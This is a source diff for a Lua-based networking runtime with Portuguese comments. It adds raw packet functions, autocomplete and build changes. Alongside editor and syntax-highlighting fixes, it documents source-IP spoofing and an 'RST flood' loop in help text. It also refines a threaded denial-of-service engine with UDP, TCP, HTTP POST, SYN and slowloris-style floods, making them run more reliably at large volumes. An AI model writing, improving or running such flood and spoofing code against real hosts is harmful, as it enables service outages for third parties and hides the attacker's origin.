+    printf("    -- FIN scan com porta de origem fixa\n");
+    printf("    local r = assert(socket.raw('fin', { spfport=31337 }))\n");
     printf("    r:settimeout(2)\n");
     printf("    r:sendto('192.168.1.1', 22)\n");
     printf("    r:close()\n\n");
@@ -40652,9 +40969,9 @@ static int l_net_help(lua_State *L) {
     printf("      flags   = \"SYN\",    -- string: SYN RST FIN ACK PSH URG xmas null\n");
     printf("                          --   ou combinacoes: \"SYN|ACK\", \"FIN|PSH|URG\"\n");
     printf("                          --   ou numero hex: 0x02 (SYN), 0x12 (SYN+ACK)\n");
-    printf("      spoof_ip  = \"1.2.3.5\",-- IP de origem spoofado\n");
+    printf("      spfip  = \"1.2.3.5\",-- IP de origem spoofado\n");
     printf("                            --   \"0\" ou 0 = aleatorio → retorna true, ip_usado\n");
-    printf("      spoof_port= 12345,    -- porta origem (0 = aleatoria)\n");
+    printf("      spfport= 12345,    -- porta origem (0 = aleatoria)\n");
     printf("      seq     = 0x41414141,-- sequence number (0 = aleatorio)\n");
     printf("      ack_seq = 0,        -- ack number\n");
     printf("      window  = 65535,    -- janela TCP (0 = 64240)\n");
@@ -40684,9 +41001,9 @@ static int l_net_help(lua_State *L) {
     printf("  \033[0;36m--- UDP raw com spoof opcional ---\033[0m\n");
     printf("    net.raw.udp(ip, port, data)\n");
     printf("    net.raw.udp(ip, port, data, {    -- opcoes:\n");
-    printf("      spoof_ip   = \"5.6.7.8\",          -- IP de origem spoofado\n");
+    printf("      spfip   = \"5.6.7.8\",          -- IP de origem spoofado\n");
     printf("                                        --   \"0\" ou 0 = aleatorio → retorna true, ip_usado\n");
-    printf("      spoof_port = 53,                 -- porta origem (0 = aleatoria)\n");
+    printf("      spfport = 53,                 -- porta origem (0 = aleatoria)\n");
     printf("      ttl      = 128,                -- TTL do pacote IP\n");
     printf("      tos      = 0,                  -- Type of Service\n");
     printf("      timeout  = 3 })\n\n");
@@ -40699,11 +41016,11 @@ static int l_net_help(lua_State *L) {
     printf("      return (p.flags & 0x12) == 0x12     --   so aceita SYN+ACK\n");
     printf("    end)                                  --   descarta o resto\n\n");
     printf("    Campos sempre presentes no retorno:\n");
-    printf("      .spoof_ip .dst_ip .ttl .proto .raw    -- raw = pacote completo\n");
+    printf("      .spfip .dst_ip .ttl .proto .raw    -- raw = pacote completo\n");
     printf("    Campos extras por protocolo:\n");
-    printf("      TCP:  .spoof_port .dst_port .seq .ack_seq\n");
+    printf("      TCP:  .spfport .dst_port .seq .ack_seq\n");
     printf("            .flags (numero) .flags_s (string \"SYN|ACK\") .window .payload\n");
-    printf("      UDP:  .spoof_port .dst_port .len .payload\n");
+    printf("      UDP:  .spfport .dst_port .len .payload\n");
     printf("      ICMP: .type .code .id .seq .payload\n\n");
 
     printf("  \033[0;36m--- send generico (voce monta o payload) ---\033[0m\n");
@@ -40722,10 +41039,10 @@ static int l_net_help(lua_State *L) {
     printf("    local p = net.raw.icmp('8.8.8.8')\n");
     printf("    if p then print(p.ms..'ms ttl='..p.ttl) end\n\n");
     printf("    -- Spoof: SYN de outro IP\n");
-    printf("    net.raw.tcp('10.0.0.1', 443, {flags='SYN', spoof_ip='10.0.0.99'})\n\n");
+    printf("    net.raw.tcp('10.0.0.1', 443, {flags='SYN', spfip='10.0.0.99'})\n\n");
     printf("    -- Captura qualquer ICMP com filtro\n");
     printf("    local pkt = net.raw.recv('icmp', 5, function(p)\n");
-    printf("      return p.spoof_ip == '8.8.8.8'\n");
+    printf("      return p.spfip == '8.8.8.8'\n");
     printf("    end)\n\n");
     printf("    -- RST flood (aliases ainda funcionam)\n");
     printf("    for i=1,10 do net.raw.rst('192.168.1.1', 80) end\n\n");
@@ -83903,15 +84220,13 @@ static const char *G_completions[] = {
     "mod.redir(","mod.help()",
     /* net.* */
     "net.dns(","net.get(","net.geth(","net.post(","net.connect(",
-    "net.tcp(","net.udp(","net.tcp6(","net.listen(",
+    "net.tcp(","net.udp(","net.tcp6(","net.listen(","net.unix(",
+    "net.ws(","net.wss(",
     "net.fire(","net.socket","net.syn(","net.send(","net.recv(","net.close(",
     "net.ip(","net.hosts(","net.scan(","net.fetch(","net.ping(","net.os(","net.import(","net.help()",
     /* net.socket (LuaSocket) */
-    "net.socket.tcp()","net.socket.tcp4()","net.socket.tcp6()","net.socket.udp()",
-    "net.socket.connect(","net.socket.bind(","net.socket.select(",
-    "net.socket.gettime()","net.socket.sleep(",
-    "net.socket.try(","net.socket.protect(","net.socket.newtry(","net.socket.skip(",
-    "net.socket.raw(",
+    "net.socket(\"tcp\")" ,"net.socket(\"tcp4\")" ,"net.socket(\"tcp6\")" ,"net.socket(\"udp\")" ,"net.socket(\"unix\")" ,
+    "net.socket.select(","net.socket.raw(",
     /* net.raw (root) */
     "net.raw.syn(","net.raw.rst(","net.raw.ack(","net.raw.fin(","net.raw.psh(",
     "net.raw.synack(","net.raw.xmas(","net.raw.null(",
@@ -84133,10 +84448,9 @@ static void dyn_scan(const char *dirpath) {
         strncpy(name, ent->d_name, sizeof(name)-1);
         name[sizeof(name)-1]='\0';
         char *dot=strrchr(name,'.');
-        if(dot){
-            if(!strcmp(dot,".lua")||!strcmp(dot,".so")) *dot='\0';
-            else continue;
-        }
+        if(!dot) continue;  /* sem extensão = diretório ou ignorável */
+        if(!strcmp(dot,".lua")||!strcmp(dot,".so")) *dot='\0';
+        else continue;
         int dup=0;
         for(int i=0;i<G_dyn_count;i++)
             if(!strcmp(G_dyn[i],name)){dup=1;break;}
@@ -84304,7 +84618,8 @@ static void lua_compl_add(const char *s) {
 }
 
 /* Referência ao lua_State global (preenchida em pmain após luaopen_net) */
-extern lua_State *_elliot_L;
+/* weak: liblua-net.so usa NULL; o binário lua sobrescreve com a definição real */
+__attribute__((weak)) lua_State *_elliot_L = NULL;
 
 /*
  * lua_scan_table — varre os campos de uma tabela Lua que está no topo da
@@ -84422,20 +84737,118 @@ void lua_scan(void) {
     }
 }
 
+static int ac_has_method(char **matches, int n,
+                          const char *varname, const char *mname) {
+    size_t vlen = strlen(varname), mlen = strlen(mname);
+    for (int i = 0; i < n; i++) {
+        const char *e = matches[i];
+        if (strncmp(e, varname, vlen)==0 && e[vlen]==':' &&
+            strncmp(e+vlen+1, mname, mlen)==0 && e[vlen+1+mlen]=='(')
+            return 1;
+    }
+    return 0;
+}
+
+static int ac_scan_tbl(lua_State *L, const char *varname,
+                        const char *mprefix, size_t mplen,
+                        char **matches, int n, int max) {
+    lua_pushnil(L);
+    while (lua_next(L, -2) && n < max) {
+        if (lua_type(L, -2) == LUA_TSTRING) {
+            const char *k = lua_tostring(L, -2);
+            if (k && k[0]!='_' &&
+                strncmp(k, mprefix ? mprefix : "", mplen)==0 &&
+                !ac_has_method(matches, n, varname, k)) {
+                char entry[256];
+                snprintf(entry, sizeof(entry), "%s:%s(", varname, k);
+                matches[n++] = strdup(entry);
+            }
+        }
+        lua_pop(L, 1);
+    }
+    return n;
+}
+
+int ac_scan_methods(const char *varname, const char *mprefix,
+                    char **matches, int max_matches) {
+#define AC_CHAIN_MAX 8
+    int n = 0;
+    lua_State *L = _elliot_L;
+    if (!L || !varname || !varname[0]) return 0;
+    size_t mplen = mprefix ? strlen(mprefix) : 0;
+    int top0 = lua_gettop(L);
+
+    /* 1. Resolve dotted path a.b.c */
+    {
+        char path[256];
+        strncpy(path, varname, sizeof(path)-1); path[sizeof(path)-1]='\0';
+        char *tok = strtok(path, ".");
+        if (!tok) goto ac_done;
+        lua_getglobal(L, tok);
+        while ((tok = strtok(NULL, ".")) != NULL) {
+            int t = lua_type(L, -1);
+            if (t != LUA_TTABLE && t != LUA_TUSERDATA) goto ac_done;
+            lua_getfield(L, -1, tok);
+            lua_remove(L, -2);
+        }
+    }
+    if (lua_isnil(L, -1)) goto ac_done;
+
+    /* 2. Traversal __index com herança, dedup e cycle detection */
+    {
+        const void *seen[AC_CHAIN_MAX]; int seen_n = 0;
+        for (int depth = 0; depth < AC_CHAIN_MAX && n < max_matches; depth++) {
+            if (!lua_getmetatable(L, -1)) {
+                if (lua_istable(L, -1))
+                    n = ac_scan_tbl(L, varname, mprefix, mplen, matches, n, max_matches);
+                break;
+            }
+            const void *mt_ptr = lua_topointer(L, -1);
+            int cycled = 0;
+            for (int i = 0; i < seen_n; i++) if (seen[i]==mt_ptr){cycled=1;break;}
+            if (cycled) { lua_pop(L, 1); break; }
+            if (seen_n < AC_CHAIN_MAX) seen[seen_n++] = mt_ptr;
+
+            lua_getfield(L, -1, "_elliot_ac");
+            if (lua_istable(L, -1)) {
+                n = ac_scan_tbl(L, varname, mprefix, mplen, matches, n, max_matches);
+                lua_pop(L, 2); break;
+            }
+            lua_pop(L, 1);
+
+            lua_getfield(L, -1, "__index");
+            lua_remove(L, -2);
+            if (lua_type(L, -1) != LUA_TTABLE) { lua_pop(L, 2); break; }
+
+            const void *idx_ptr = lua_topointer(L, -1);
+            int idx_cycled = 0;
+            for (int i = 0; i < seen_n; i++) if (seen[i]==idx_ptr){idx_cycled=1;break;}
+            n = ac_scan_tbl(L, varname, mprefix, mplen, matches, n, max_matches);
+            if (idx_cycled) { lua_pop(L, 1); break; }
+            if (seen_n < AC_CHAIN_MAX) seen[seen_n++] = idx_ptr;
+            lua_remove(L, -2);
+        }
+    }
+
+ac_done:
+    lua_settop(L, top0);
+    return n;
+#undef AC_CHAIN_MAX
+}
+
 /* ── Módulos @std conhecidos e suas funções (fallback sem L) ─────── */
 /* Usado quando o módulo ainda não foi carregado mas o usuário digitou
  * require("@std/net") — lista as funções típicas para orientar. */
 typedef struct { const char *mod; const char *fns[64]; } ElliotModHint;
 static const ElliotModHint G_mod_hints[] = {
     {"@std/net", {
-        "net.tcp(","net.udp(","net.tcp6(","net.listen(","net.scan(","net.dns(",
+        "net.tcp(","net.udp(","net.tcp6(","net.listen(","net.unix(","net.scan(","net.dns(",
         "net.get(","net.geth(","net.post(","net.fetch(","net.ping(","net.syn(",
+        "net.ws(","net.wss(",
         "net.os(","net.ip(","net.import(","net.connect(","net.help()",
         /* socket LuaSocket */
-        "net.socket.tcp()","net.socket.udp()","net.socket.tcp6()",
-        "net.socket.connect(","net.socket.bind(","net.socket.select(",
-        "net.socket.try(","net.socket.protect(","net.socket.newtry(",
-        "net.socket.raw(","net.socket.gettime()","net.socket.sleep(",
+        "net.socket(\"tcp\")" ,"net.socket(\"udp\")" ,"net.socket(\"tcp6\")" ,"net.socket(\"unix\")" ,
+        "net.socket.select(","net.socket.raw(",
         /* net.raw (root) */
         "net.raw.syn(","net.raw.rst(","net.raw.ack(","net.raw.fin(",
         "net.raw.psh(","net.raw.synack(","net.raw.xmas(","net.raw.null(",
@@ -93563,9 +93976,9 @@ static int l_ms_force(lua_State *L) {
                 "if bad ~= nil then return false, 'flag invalida nao rejeitou' end\n"
                 "if not berr or not berr:find('invalida') then\n"
                 "  return false, 'msg erro ausente: '..tostring(berr) end\n"
-                /* spoof_ip e spoof_port aceitos sem crash */
+                /* spfip e spfport aceitos sem crash */
                 "local ok2, e2 = net.raw.tcp('127.0.0.1', 19999, {\n"
-                "  flags='SYN', spoof_ip='10.0.0.99', spoof_port=12345,\n"
+                "  flags='SYN', spfip='10.0.0.99', spfport=12345,\n"
                 "  ttl=128, payload='MSFORCE', timeout=2})\n"
                 "if not ok2 then return false, 'spoof+payload: '..(e2 or 'nil') end\n"
                 "return true, 'OK'\n";
@@ -93616,7 +94029,7 @@ static int l_ms_force(lua_State *L) {
                 "local ok, err = net.raw.udp('127.0.0.1', 19999, 'MSFORCE_UDP', {timeout=2})\n"
                 "if not ok then return false, 'udp basico: '..(err or 'nil') end\n"
                 "local ok2, e2 = net.raw.udp('127.0.0.1', 19999, 'SPOOF',\n"
-                "  {spoof_ip='10.0.0.99', spoof_port=5353, ttl=64, timeout=2})\n"
+                "  {spfip='10.0.0.99', spfport=5353, ttl=64, timeout=2})\n"
                 "if not ok2 then return false, 'udp spoof: '..(e2 or 'nil') end\n"
                 "return true, 'OK'\n";
             int ok=0; const char *diag="falhou";
@@ -93626,7 +94039,7 @@ static int l_ms_force(lua_State *L) {
                     if(lua_isstring(L,-1)) diag=lua_tostring(L,-1); }
                 else if(lua_isstring(L,-1)) diag=lua_tostring(L,-1); }
             lua_settop(L,base); t1=mst_now_ms();
-            frc_result(&fr,"net.raw.udp (basico + spoof_ip/port)",ok,t1-t0,ok?"OK":diag);
+            frc_result(&fr,"net.raw.udp (basico + spfip/port)",ok,t1-t0,ok?"OK":diag);
         }
 
         /* TEST: net.raw.recv — envia ICMP e captura a resposta com recv
@@ -97505,34 +97918,11 @@ static int luaopen_net_thread(lua_State *L) {
     lua_pushcfunction(L,l_net_ws);       lua_setfield(L,-2,"ws");
     lua_pushcfunction(L,l_net_wss);      lua_setfield(L,-2,"wss");
     lua_pushcfunction(L,l_net_listen);   lua_setfield(L,-2,"listen");
-    /* net.socket — tabela compatível com LuaSocket 3.x */
+    /* net.socket(proto) — net.socket("tcp") / net.socket("udp") / net.socket("tcp6") */
     lsock_register_meta(L);
-    /* registra metatable para try/protect */
     luaL_newmetatable(L, LSOCK_TRY_META); lua_pop(L,1);
-    lua_newtable(L);
-    /* construtores */
-    lua_pushcfunction(L, l_lsock_tcp);          lua_setfield(L,-2,"tcp");
-    lua_pushcfunction(L, l_lsock_tcp4);         lua_setfield(L,-2,"tcp4");
-    lua_pushcfunction(L, l_lsock_tcp6);         lua_setfield(L,-2,"tcp6");
-    lua_pushcfunction(L, l_lsock_udp);          lua_setfield(L,-2,"udp");
-    /* utilitários */
-    lua_pushcfunction(L, l_lsock_select);       lua_setfield(L,-2,"select");
-    lua_pushcfunction(L, l_lsock_connect_sh);   lua_setfield(L,-2,"connect");
-    lua_pushcfunction(L, l_lsock_bind_sh);      lua_setfield(L,-2,"bind");
-    lua_pushcfunction(L, l_lsock_gettime);      lua_setfield(L,-2,"gettime");
-    lua_pushcfunction(L, l_lsock_sleep);        lua_setfield(L,-2,"sleep");
-    lua_pushcfunction(L, l_lsock_try);          lua_setfield(L,-2,"try");
-    lua_pushcfunction(L, l_lsock_protect);      lua_setfield(L,-2,"protect");
-    lua_pushcfunction(L, l_lsock_newtry);       lua_setfield(L,-2,"newtry");
-    lua_pushcfunction(L, l_lsock_skip);         lua_setfield(L,-2,"skip");
-    /* constantes */
-    lua_pushstring(L, "3.1.0-elliot");          lua_setfield(L,-2,"_VERSION");
-    lua_pushinteger(L, 8192);                   lua_setfield(L,-2,"_DATAGRAMSIZE");
-    lua_pushinteger(L, 1024);                   lua_setfield(L,-2,"_SETSIZE");
-#ifdef ELLIOT_ROOT
-    lua_pushcfunction(L, l_lsock_raw);          lua_setfield(L,-2,"raw");
-#endif
-    lua_setfield(L,-2,"socket");
+    lua_pushcfunction(L, l_net_socket_new); lua_setfield(L,-2,"socket");
+    lua_pushcfunction(L, l_net_unix);       lua_setfield(L,-2,"unix");
     lua_pushcfunction(L,l_net_syn);      lua_setfield(L,-2,"syn");
     lua_pushcfunction(L,l_net_fire);   lua_setfield(L,-2,"fire");
     lua_pushcfunction(L,l_net_send);     lua_setfield(L,-2,"send");
@@ -97545,6 +97935,7 @@ static int luaopen_net_thread(lua_State *L) {
 
 
 
+    lua_pushcfunction(L,l_net_set_verbose); lua_setfield(L,-2,"verbose");
     lua_pushcfunction(L,l_net_os);       lua_setfield(L,-2,"os");
     lua_pushcfunction(L,l_net_scan_hosts); lua_setfield(L,-2,"ip");
 #ifdef ELLIOT_ROOT
@@ -109242,13 +109633,13 @@ TRANSLATE_EOF
         printf "\033[1;36m── [2/4] make Lua core ───────────────────────────────────────\033[0m\n"
         make -j"$_ncpu" posix CC="${_CC}" \
             MYCFLAGS="${_MAKE_FLAGS} -fPIC -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DLUA_USE_READLINE -Wno-unknown-escape-sequence ${PROFILE_DEFINES} ${_INC}" \
-            MYLIBS="-lm -ldl -lpthread -lreadline -lcurl -lssl -lcrypto -lsqlite3 ${_LIB}" \
+            MYLIBS="-lm -ldl -lpthread -lreadline -lcurl -lssl -lcrypto -lsqlite3 -lresolv ${_LIB} -rdynamic" \
             2>&1 | tee "$HOME/.elliot_make.log"
         _make_exit=${PIPESTATUS[0]}
     else
         make -j"$_ncpu" posix CC="${_CC}" \
             MYCFLAGS="${_MAKE_FLAGS} -fPIC -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DLUA_USE_READLINE -Wno-unknown-escape-sequence ${PROFILE_DEFINES} ${_INC}" \
-            MYLIBS="-lm -ldl -lpthread -lreadline -lcurl -lssl -lcrypto -lsqlite3 ${_LIB}" \
+            MYLIBS="-lm -ldl -lpthread -lreadline -lcurl -lssl -lcrypto -lsqlite3 -lresolv ${_LIB} -rdynamic" \
             > "$HOME/.elliot_make.log" 2>&1 &
         _make_pid=$!
         # Total de objetos esperados (aprox 35), barra começa em 45%
@@ -109343,7 +109734,7 @@ TRANSLATE_EOF
         ${_CC} ${_MAKE_FLAGS} -shared \
             $_so_objs libnet.o \
             -o liblua-net.so \
-            ${_LIB} -lm -ldl -lpthread -lreadline -lcurl -lssl -lcrypto -lsqlite3 \
+            ${_LIB} -lm -ldl -lpthread -lreadline -lcurl -lssl -lcrypto -lsqlite3 -lresolv \
             2>&1 | tee -a "$_so_log"
         _so_exit=${PIPESTATUS[0]}
         if [ "$_so_exit" -eq 0 ]; then
@@ -109369,7 +109760,7 @@ TRANSLATE_EOF
             ${_CC} ${_MAKE_FLAGS} -shared \
                 $_so_objs libnet.o \
                 -o liblua-net.so \
-                ${_LIB} -lm -ldl -lpthread -lreadline -lcurl -lssl -lcrypto -lsqlite3 \
+                ${_LIB} -lm -ldl -lpthread -lreadline -lcurl -lssl -lcrypto -lsqlite3 -lresolv \
                 2>/dev/null && \
                 cp liblua-net.so "${_TPFX}/lib/liblua-net.so" || true
             rm -f $_so_objs
@@ -125885,7 +126276,7 @@ for _, p in ipairs(portas_comuns) do
         if s then pcall(function()s:close()end); return %d end
         return 0
     ]], host, p, p)
-    tids[#tids+1] = {p=p, tid=sys.thread(code)}
+    tids[#tids+1] = {p=p, tid=sys.thread(_THREAD_BOOTSTRAP .. code)}
 end
 for _, t in ipairs(tids) do
     local r = sys.join(t.tid, 5000)
@@ -126052,7 +126443,7 @@ for i = 0, n_thr-1 do
         for _, p in ipairs(abertas) do r = r .. p .. "," end
         return r
     ]], ini, fim, ip)
-    tids[#tids+1] = sys.thread(code)
+    tids[#tids+1] = sys.thread(_THREAD_BOOTSTRAP .. code)
 end
 
 for i, tid in ipairs(tids) do
@@ -126286,30 +126677,57 @@ local function pb_draw(sent)
 end
 
 local function pb_finish(sent)
-    sent=sent or pb_total
-    local line=string.format("\r%s[%s]%s 100.0%% | Pacotes-Nexus: %s%d/%d%s\n",
-        BLU,string.rep("█",30),RST,GRN,sent,pb_total,RST)
-    if #line<pb_last then line=line..string.rep(" ",pb_last-#line) end
+    sent = sent or 0
+    local frac = pb_total > 0 and math.min(sent/pb_total, 1.0) or 0
+    local done = math.floor(30*frac)
+    local line = string.format("\r%s[%s%s]%s %5.1f%% | Pacotes-Nexus: %s%d/%d%s\n",
+        BLU, string.rep("█",done), string.rep("-",30-done), RST,
+        frac*100, GRN, sent, pb_total, RST)
+    if #line < pb_last then line = line..string.rep(" ", pb_last-#line) end
     io.write(line); io.flush()
 end
 
 -- ── Engine de threads: lança N threads, coleta via join sequencial ────────────
 local MAX_CONCURRENT = 32  -- max threads rodando ao mesmo tempo
 
+-- bootstrap de globals para threads: o prelude que instala require('@std')
+-- roda só na main thread. Nas worker-threads, _elliot_std está populado mas
+-- não vira global automaticamente. Este snippet replica o que require('@std')
+-- faria se o prelude estivesse ativo.
+local _THREAD_BOOTSTRAP =
+    "do local _s=_G._elliot_std;if _s then" ..
+    " for k,v in pairs(_s) do if rawget(_G,k)==nil then _G[k]=v end end" ..
+    " end end\n" ..
+    -- silencia [TCP]/[UDP] verbose nas worker threads (flag thread-local no C)
+    "if net and net.verbose then net.verbose(false) end\n"
+
 local function launch_and_collect(code, n_threads, total)
     pb_init(total); pb_draw(0)
     local acc = 0
     local launched = 0
+    -- warmup: inicializa o thread pool antes do batch principal
+    -- evita segfault por race condition na criação do pool no primeiro uso
+    do
+        local ok, tid = pcall(sys.thread, _THREAD_BOOTSTRAP .. "return 0")
+        if ok and tid and tid > 0 then sys.join(tid, 200) end
+        sys.sleep(30)
+    end
 
-    -- timeout adaptativo: min 5s, max 30s, baseado no workload por thread
+    -- timeout adaptativo por thread: assume ~150ms por pacote (RTT TCP/HTTP)
+    -- min 15s para absorver overhead de conexão; max 300s para floods grandes
     local per_thread_est = math.ceil(total / math.max(n_threads, 1))
-    local join_timeout = math.min(30000, math.max(5000, per_thread_est * 15))
+    local join_timeout = math.min(300000, math.max(15000, per_thread_est * 150))
+
+    -- Prepend bootstrap: expõe _elliot_std como globals (net, sys, fs...)
+    -- O prelude que instala require('@std') só roda na main thread; nas
+    -- worker-threads o hook não existe e require('@std') falha silenciosamente.
+    local runcode = _THREAD_BOOTSTRAP .. code
 
     while launched < n_threads do
         local batch_sz = math.min(MAX_CONCURRENT, n_threads - launched)
         local batch = {}
         for _=1, batch_sz do
-            local ok, tid = pcall(sys.thread, code)
+            local ok, tid = pcall(sys.thread, runcode)
             if ok and tid and tid > 0 then batch[#batch+1] = tid end
         end
         launched = launched + batch_sz
@@ -126341,15 +126759,14 @@ local s=net.udp(%q,%d,2)
 local sent=0
 if s then
     local chunk=string.rep("A",%d)
-    local last_chunk=string.rep("A",%d)  -- ultimo chunk pode ser menor
+    local last_chunk=string.rep("A",%d)
     local n_chunks=%d
     for _=1,%d do
-        local ok=true
+        sent=sent+1  -- UDP é fire-and-forget; conta envio independente de ICMP unreachable
         for c=1,n_chunks do
             local p=(c==n_chunks) and last_chunk or chunk
-            if not pcall(function()s:send(p)end) then ok=false; break end
+            if not pcall(function()s:send(p)end) then break end
         end
-        if ok then sent=sent+1 end
     end
     pcall(function()s:close()end)
 end
@@ -126379,14 +126796,13 @@ local n_chunks=%d
 local sent=0
 for _=1,%d do
     local s=net.tcp(%q,%d,1)
+    sent=sent+1  -- conta tentativa: SYN enviado independente do resultado
     if s then
-        local ok=true
         for c=1,n_chunks do
             local chunk=(c==n_chunks) and last_p or p
-            if not pcall(function()s:send(chunk)end) then ok=false; break end
+            if not pcall(function()s:send(chunk)end) then break end
         end
         pcall(function()s:close()end)
-        if ok then sent=sent+1 end
     end
 end
 return sent
@@ -126395,24 +126811,26 @@ return sent
 end
 
 local function http_flood(ip,port,pkt_per_thread,n_threads,pkt_size)
+    -- net.fetch/libcurl requer inicialização OpenSSL por thread (thread-unsafe).
+    -- Usa net.tcp com raw HTTP POST — mesmo mecanismo do tcp_flood, que já funciona.
+    local body = string.rep("A", pkt_size)
+    local req = string.format(
+        "POST / HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\n"..
+        "Content-Length: %d\r\nConnection: close\r\n\r\n%s",
+        ip, pkt_size, body)
     local code=string.format([[
-local url=%q
-local body=string.rep("A",%d)
+local req=%q
 local sent=0
 for _=1,%d do
-    -- net.fetch suporta method+body+headers corretamente
-    local ok,_,c=pcall(net.fetch,url,{
-        method="POST",
-        body=body,
-        headers={["Content-Type"]="application/x-www-form-urlencoded",
-                 ["Content-Length"]=tostring(%d)},
-        timeout=3,
-        quiet=true,
-    })
-    if ok and c and c>0 then sent=sent+1 end
+    local s=net.tcp(%q,%d,3)
+    sent=sent+1
+    if s then
+        pcall(function()s:send(req)end)
+        pcall(function()s:close()end)
+    end
 end
 return sent
-]], "http://"..ip..":"..port.."/",pkt_size,pkt_per_thread,pkt_size)
+]], req, pkt_per_thread, ip, port)
     return launch_and_collect(code,n_threads,pkt_per_thread*n_threads)
 end
 
@@ -126447,8 +126865,8 @@ local function syn_flood(ip,port,pkt_per_thread,n_threads)
     local code=string.format([[
 local sent=0
 for _=1,%d do
-    local ok=pcall(net.fire,"ipv4","syn",%q,%d,0)
-    if ok then sent=sent+1 end
+    pcall(net.fire,"ipv4","syn",%q,%d,0)
+    sent=sent+1  -- SYN é sempre enviado pelo kernel no connect() não-bloqueante
 end
 return sent
 ]], pkt_per_thread,ip,port)
@@ -126537,7 +126955,7 @@ local function slow_cosmo(ip,port,n_sockets,sleep_sec,rand_ua,verbose,n_threads)
             :gsub("RANDUA_VAL",rand_ua and "true" or "false")
             :gsub("UID_VAL",   tostring(i))
             :gsub("UA_LIST",   UA_BLOCK)
-        local ok, tid = pcall(sys.thread, code)
+        local ok, tid = pcall(sys.thread, _THREAD_BOOTSTRAP .. code)
         if ok and tid and tid>0 then tids[#tids+1]=tid; launched=launched+1 end
         sys.sleep(20)
         if verbose then
@@ -129093,7 +129511,7 @@ static void update_syntax(Row *row) {
     int mel  = mce ? (int)strlen(mce) : 0;
 
     int is_c    = (E.syntax == &HLDB[0]);
-    int is_lua  = (E.syntax == &HLDB[0]);
+    int is_lua  = (E.syntax == &HLDB[1]);
     int is_bash = (E.syntax == &HLDB[2]);
     int is_html = (E.syntax == &HLDB[3]);
 
@@ -130166,7 +130584,7 @@ static void comp_open(void) {
     if (E.syntax && (E.syntax == &HLDB[0])) {   /* C / C++ */
         if (comp_open_include()) return;
     }
-    if (E.syntax && E.syntax == &HLDB[0]) {   /* Lua */
+    if (E.syntax && E.syntax == &HLDB[1]) {   /* Lua */
         if (comp_open_require()) return;
     }
 
@@ -130188,7 +130606,7 @@ static void comp_open(void) {
      * kw_preproc do Lua (lua_meth) é só nomes de método soltos — excluído.
      * kw_types do Lua (lua_ns) = nomes de módulo: só entra se required. */
     if (E.syntax) {
-        int is_lua = (E.syntax == &HLDB[0]);
+        int is_lua = (E.syntax == &HLDB[1]);
         const char **lists[] = {
             E.syntax->kw_flow, E.syntax->kw_builtin,
             E.syntax->kw_types, is_lua ? NULL : E.syntax->kw_preproc, NULL
@@ -130232,7 +130650,7 @@ static void comp_open_live(void) {
     if (E.syntax && (E.syntax == &HLDB[0])) {
         if (comp_open_include()) return;
     }
-    if (E.syntax && E.syntax == &HLDB[0]) {
+    if (E.syntax && E.syntax == &HLDB[1]) {   /* Lua */
         if (comp_open_require()) return;
     }
 
@@ -130244,7 +130662,7 @@ static void comp_open_live(void) {
     /* Keywords primeiro — ver comentário em comp_open().
      * kw_types do Lua (lua_ns) = nomes de módulo: só entra se required. */
     if (E.syntax) {
-        int is_lua = (E.syntax == &HLDB[0]);
+        int is_lua = (E.syntax == &HLDB[1]);
         const char **lists[] = {
             E.syntax->kw_flow, E.syntax->kw_builtin,
             E.syntax->kw_types, is_lua ? NULL : E.syntax->kw_preproc, NULL
@@ -135976,6 +136394,24 @@ static void process_key(void) {
                 E.comp.selected--;
                 if (E.comp.selected < 0) E.comp.selected = E.comp.count-1;
                 return;
+            case BACKSPACE:
+            case CTRL('h'): {
+                /* Fecha popup, apaga char/par — mas NÃO chama comp_open_live().
+                 * comp_open_live() chamaria comp_open_require() que, ao ver r==2
+                 * (cursor após '(' sem aspas), re-inseriria "" automaticamente,
+                 * fazendo o backspace parecer que não fez nada. */
+                comp_close();
+                if (!try_smart_backspace()) {
+                    undo_push(); del_char();
+                }
+                /* Reabre popup APENAS se cursor ainda está DENTRO de aspas
+                 * existentes (r==1). Se as aspas foram apagadas (r==2 ou 0),
+                 * não reabre — deixa o usuário digitar normalmente. */
+                { char _pfx[128];
+                  if (detect_require_ctx(_pfx, sizeof(_pfx)) == 1)
+                      comp_open_require(); }
+                return;  /* return: não cai no switch principal */
+            }
             case '\r':
             case '\t': {
                 /* Captura o item antes de comp_apply() fechar o popup */
